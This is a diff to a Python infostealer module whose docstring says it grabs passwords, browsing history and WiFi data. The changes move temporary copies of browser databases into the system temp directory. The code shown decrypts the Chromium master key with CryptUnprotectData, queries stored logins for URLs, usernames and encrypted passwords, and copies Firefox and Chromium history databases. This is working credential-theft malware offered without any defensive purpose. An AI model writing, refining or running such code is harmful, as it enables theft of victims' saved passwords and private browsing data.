@@ -3,7 +3,7 @@ Grabber Module - Extract passwords, history, WiFi
 Optimized with concurrent extraction
 
 Developer: TsByin
-Version: 11.0
+Version: 12.0
 """
 
 import os
@@ -12,6 +12,7 @@ import json
 import shutil
 import logging
 import gzip
+import tempfile
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime, timedelta
 from Cryptodome.Cipher import AES
@@ -29,7 +30,7 @@ def get_master_key(path):
         with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
             local_state = json.loads(f.read())
         
-        from win32crypt import CryptUnprotectData
+        from win32crypt import CryptUnprotectData  # type: ignore[import-untyped]
         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
         return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
     except Exception as e:
@@ -61,13 +62,14 @@ def _extract_browser_passwords(browser_name, path, timeout=10):
         if not os.path.exists(db):
             continue
         
-        temp_db = f"db_tmp_{browser_name}_{profile}"
+        # B12 fixed: use system temp dir instead of CWD
+        fd, temp_db = tempfile.mkstemp(suffix='.db', prefix=f'pw_{browser_name}_{profile}_')
+        os.close(fd)
         try:
             shutil.copy2(db, temp_db)
             conn = sqlite3.connect(temp_db, timeout=timeout)
             cur = conn.cursor()
             cur.execute("SELECT action_url, username_value, password_value FROM logins")
-            
             for url, username, encrypted_pass in cur.fetchall():
                 try:
                     if not encrypted_pass or len(encrypted_pass) < 15:
@@ -289,7 +291,9 @@ def _extract_firefox_history_all(browser_name, path, limit, output_files, all_hi
                 logger.debug(f"No history DB for {profile}")
                 continue
             
-            temp_db = f"hist_tmp_{browser_name}_{profile}"
+            # B12 fixed: temp file in system temp dir
+            fd, temp_db = tempfile.mkstemp(suffix='.db', prefix=f'hist_ff_{browser_name}_')
+            os.close(fd)
             try:
                 shutil.copy2(db, temp_db)
                 conn = sqlite3.connect(temp_db)
@@ -362,7 +366,9 @@ def _extract_chromium_history_all(browser_name, path, limit, output_files, all_h
                 logger.debug(f"No history DB for {profile}")
                 continue
             
-            temp_db = f"hist_tmp_{browser_name}_{profile}"
+            # B12 fixed: temp file in system temp dir
+            fd, temp_db = tempfile.mkstemp(suffix='.db', prefix=f'hist_cr_{browser_name}_')
+            os.close(fd)
             try:
                 shutil.copy2(db, temp_db)
                 conn = sqlite3.connect(temp_db)
